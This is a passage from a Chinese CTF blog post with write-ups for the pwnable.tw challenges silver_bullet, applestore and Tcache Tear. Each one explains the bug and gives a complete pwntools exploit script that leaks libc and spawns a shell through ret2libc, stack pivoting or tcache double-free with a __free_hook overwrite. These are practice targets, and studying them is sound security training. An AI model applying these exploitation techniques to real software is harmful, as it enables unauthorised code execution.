<p>选项2是power_up，其中的strncat中存在漏洞，因为它会将字符串拼接在源字符串之后，然后再加一个<code>\x00</code>，从而修改了长度，使得我们可以再次调用选项2劫持返回地址</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet4.jpg" alt="silver_bullet3" title="">
                </div>
                <div class="image-caption">silver_bullet3</div>
            </figure></div>

<p>选项3是beat，也就是当数据长度大于一定值的时候，程序便会退出</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/silver_bullet5.jpg" alt="silver_bullet4" title="">
                </div>
                <div class="image-caption">silver_bullet4</div>
            </figure></div>

<h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先create长度位0x2f的数据，然后power_up一个字节，这样下一次便可以覆盖返回地址</p>
<p>先将返回地址改为puts的plt表，传入参数puts的got表的地址便可泄露libc</p>
<p>然后将程序控制回main，再执行一次，用同样的方法控制程序返回system，从而getshell</p>
<h2 id="解题脚本-6"><a href="#解题脚本-6" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process('./silver_bullet')</span></span><br><span class="line">elf = ELF(<span class="string">'./silver_bullet'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10103</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(idx)</span>:</span></span><br><span class="line">	r.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(data)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'Give me your description of bullet :'</span>)</span><br><span class="line">	r.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(data)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'Give me your another description of bullet :'</span>)</span><br><span class="line">	r.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beat</span><span class="params">()</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">'1'</span>*<span class="number">0x2f</span>)</span><br><span class="line">add(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\xff'</span>*<span class="number">7</span></span><br><span class="line">payload += p32(puts_plt)</span><br><span class="line">payload += p32(main)</span><br><span class="line">payload += p32(puts_got)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'\x00'</span>*<span class="number">4</span>+<span class="string">'1234'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,'b *0x08048954')</span></span><br><span class="line"></span><br><span class="line">add(payload)</span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Oh ! You win !!\x0a'</span>)</span><br><span class="line">libc_base = u32(r.recvuntil(<span class="string">'\x0a'</span>,drop=<span class="keyword">True</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">success(<span class="string">'libc_base: '</span>+ hex(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">new(<span class="string">'1'</span>*<span class="number">0x2f</span>)</span><br><span class="line">add(<span class="string">'1'</span>)</span><br><span class="line">payload = <span class="string">'\xff'</span>*<span class="number">7</span></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(main)</span><br><span class="line">payload += p32(bin_sh)</span><br><span class="line"></span><br><span class="line">add(payload)</span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="applestore"><a href="#applestore" class="headerlink" title="applestore"></a>applestore</h1><h2 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>tomcr00se rooted the galaxy S5, but we need you to jailbreak the iPhone8!<br>nc chall.pwnable.tw 10104</p>
</blockquote>
<h2 id="基本信息-7"><a href="#基本信息-7" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接，开了Canary，NX和Partial RELRO</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore0.jpg" alt="applestore0" title="">
                </div>
                <div class="image-caption">applestore0</div>
            </figure></div>

<p>题目看似是个堆题，实际上是个栈题</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore1.jpg" alt="applestore1" title="">
                </div>
                <div class="image-caption">applestore1</div>
            </figure></div>

<p>选项1是list，可以列出当前store的商品</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore2.jpg" alt="applestore2" title="">
                </div>
                <div class="image-caption">applestore2</div>
            </figure></div>

<p>选项2是add，可以添加商品到myCart中，其中myCart是一个双向列表，连接着各个商品</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore3.jpg" alt="applestore3" title="">
                </div>
                <div class="image-caption">applestore3</div>
            </figure></div>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore4.jpg" alt="applestore4" title="">
                </div>
                <div class="image-caption">applestore4</div>
            </figure></div>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore5.jpg" alt="applestore5" title="">
                </div>
                <div class="image-caption">applestore5</div>
            </figure></div>

<p>选项3是delete，将指定的商品从myCart中拿去，类似于unlink</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore6.jpg" alt="applestore6" title="">
                </div>
                <div class="image-caption">applestore6</div>
            </figure></div>

<p>选项4是cart，可以遍历myCart链表并打印出各个商品的价格</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore7.jpg" alt="applestore7" title="">
                </div>
                <div class="image-caption">applestore7</div>
            </figure></div>

<p>选项5是checkout，当商品总价为<code>0x1C06</code>时，在myCart末端添加一个iPhone 8，该结构体位于栈上</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore8.jpg" alt="applestore8" title="">
                </div>
                <div class="image-caption">applestore8</div>
            </figure></div>

<p>结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Phone</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> price;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Phone</span> *<span class="title">fd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Phone</span> *<span class="title">bk</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><p>该题有几个知识点：</p>
<p>1.atoi只会转换数字，但是如果你输入别的东西，也会把这些东西放在栈上，且<code>\x00</code>也是可以放上去的</p>
<p>2.libc中有一个东西叫<code>environ</code>，是栈上的一个地址，debug出来是一开始的ebp</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/applestore9.jpg" alt="applestore9" title="">
                </div>
                <div class="image-caption">applestore9</div>
            </figure></div>

<p>3.栈劫持可以控制程序流</p>
<p>解题思路如下：</p>
<p>1.add出6个iPhone 6和20个iPhone 6 plus，调用checkout将iPhone 8加入myCart</p>
<p>2.利用atoi覆盖iPhone 8结构体，使得name指向puts的got表处，fd置0，bk指向一个可写区域，这样就可以通过delete泄露libc，然后让unlink失效，即我们的myCard链表尾还是该结构体</p>
<p>3.利用栈劫持，用handler里面的nptr的地址覆盖handler的ebp，通过delete触发unlink，使得程序从handler退出后esp指向nptr</p>
<p>4.最后布置nptr调用system(‘sh’)即可</p>
<h2 id="解题脚本-7"><a href="#解题脚本-7" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">'./applestore'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(p)</span></span><br><span class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10104</span>)</span><br><span class="line">elf = ELF(p)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(idx)</span>:</span></span><br><span class="line">	r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	r.send(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'Device Number&gt; '</span>)</span><br><span class="line">	r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'Item Number&gt; '</span>)</span><br><span class="line">	r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">(choice)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'Let me check your cart. ok? (y/n) &gt;'</span>)</span><br><span class="line">	r.sendline(choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span><span class="params">(choice)</span>:</span></span><br><span class="line">	cmd(<span class="number">5</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'Let me check your cart. ok? (y/n) &gt; '</span>)</span><br><span class="line">	r.sendline(choice)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">	add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">checkout(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_libc = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">bss = elf.bss(<span class="number">0x100</span>)	</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'27'</span></span><br><span class="line">payload += p32(puts_got)</span><br><span class="line">payload += <span class="string">'\x00'</span>*<span class="number">8</span></span><br><span class="line">payload += p32(bss)</span><br><span class="line"></span><br><span class="line">free(payload)</span><br><span class="line">r.recvuntil(<span class="string">'Remove 27:'</span>)</span><br><span class="line">libc_base = u32(r.recv(<span class="number">4</span>)) - puts_libc</span><br><span class="line">success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">environ = libc_base + libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'27'</span></span><br><span class="line">payload += p32(environ)</span><br><span class="line">payload += <span class="string">'\x00'</span>*<span class="number">12</span></span><br><span class="line">free(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Remove 27:'</span>)</span><br><span class="line">stack_base = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">ebp = stack_base - <span class="number">0xc4</span></span><br><span class="line">stack = stack_base - <span class="number">0xe4</span></span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">'sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'27'</span></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(stack)</span><br><span class="line">payload += p32(ebp<span class="number">-8</span>)</span><br><span class="line"></span><br><span class="line">free(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'06'</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) <span class="comment">#ebp</span></span><br><span class="line">payload += p32(system) <span class="comment">#target_function</span></span><br><span class="line">payload += p32(stack) <span class="comment">#ret_addr</span></span><br><span class="line">payload += p32(bin_sh) <span class="comment">#bin_sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,'b *0x08048C31')</span></span><br><span class="line"></span><br><span class="line">cmd(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Tcache-Tear"><a href="#Tcache-Tear" class="headerlink" title="Tcache Tear"></a>Tcache Tear</h1><h2 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>Make tcache great again !<br>nc chall.pwnable.tw 10207</p>
</blockquote>
<h2 id="基本信息-8"><a href="#基本信息-8" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接，除了PIE全开，libc2.27</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear0.jpg" alt="tcache_tear0" title="">
                </div>
                <div class="image-caption">tcache_tear0</div>
            </figure></div>

<p>题目是个堆题，有add，free和show</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear1.jpg" alt="tcache_tear1" title="">
                </div>
                <div class="image-caption">tcache_tear1</div>
            </figure></div>

<p>选项1是add，可以add任意个size小于0xff的chunk，且读入的数据是<code>size-0x10</code>，该参数在my_read中是无符号的，意味着我们如果输入的size小于0x10，则可以输入远大于size的数据，造成堆溢出</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear2.jpg" alt="tcache_tear2" title="">
                </div>
                <div class="image-caption">tcache_tear2</div>
            </figure></div>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear6.jpg" alt="tcache_tear6" title="">
                </div>
                <div class="image-caption">tcache_tear6</div>
            </figure></div>

<p>选项2是delete，删除ptr指针所指向的chunk且未置空</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear3.jpg" alt="tcache_tear3" title="">
                </div>
                <div class="image-caption">tcache_tear3</div>
            </figure></div>

<p>选项3是show，将bss段上的name区域的东西打印出来</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear4.jpg" alt="tcache_tear4" title="">
                </div>
                <div class="image-caption">tcache_tear4</div>
            </figure></div>

<p>可以看到bss段上name和ptr挨在一起</p>
<div style="width: 80%; margin: auto"><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2019/09/13/Pwn-tw-刷题记录/tcache_tear5.jpg" alt="tcache_tear5" title="">
                </div>
                <div class="image-caption">tcache_tear5</div>
            </figure></div>

<h2 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h2><p>1.tcache的double free任意写到bss段上<code>name-0x10+0x600</code>处，构造伪造的chunk</p>
<p>2.再double free一次任意写到<code>name-0x10</code>处伪造<code>0x600</code>的chunk，并且修改<code>ptr</code>，使得下次free可以free到我们伪造在name的chunk</p>
<p>3.free之后将伪造的chunk放入unsorted bin，此时用show就可以泄露libc地址，进而写free_hook为one_gadget来getshell</p>
<h2 id="解题脚本-8"><a href="#解题脚本-8" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">'./tcache_tear'</span></span><br><span class="line"><span class="comment">#r = process(p,aslr=True)</span></span><br><span class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10207</span>)</span><br><span class="line">elf = ELF(p)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">welcome</span><span class="params">(name)</span>:</span></span><br><span class="line">	r.recvuntil(<span class="string">'Name:'</span>)</span><br><span class="line">	r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(idx)</span>:</span></span><br><span class="line">	r.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	r.send(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	r.sendline(str(size))</span><br><span class="line">	r.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">	r.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="number">0x602060</span></span><br><span class="line">ptr = <span class="number">0x602088</span></span><br><span class="line">stdout = <span class="number">0x602020</span></span><br><span class="line"></span><br><span class="line">welcome(<span class="string">'ver'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">'1'</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,p64(name<span class="number">-0x10</span>+<span class="number">0x600</span>))</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">'2'</span>)</span><br><span class="line">add(<span class="number">0x70</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'3'</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(name<span class="number">-0x10</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'4'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x601</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(name))</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Name :'</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'5'</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'6'</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2020-01-21T06:25:40.157Z" itemprop="dateUpdated">2020-01-21 14:25:40</time>
</span><br>


        
    </div>
    
    <footer>
        <a href="http://yoursite.com">
            <img src="/img/avatar.png" alt="Ver">
            Ver
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li></ul>


            


        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2020/01/11/Xman笔记/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Xman笔记</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2019/08/19/Random-attack/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Random attack</h4>
      </a>
    </div>
  
</nav>



    




















</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style="display:none">
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
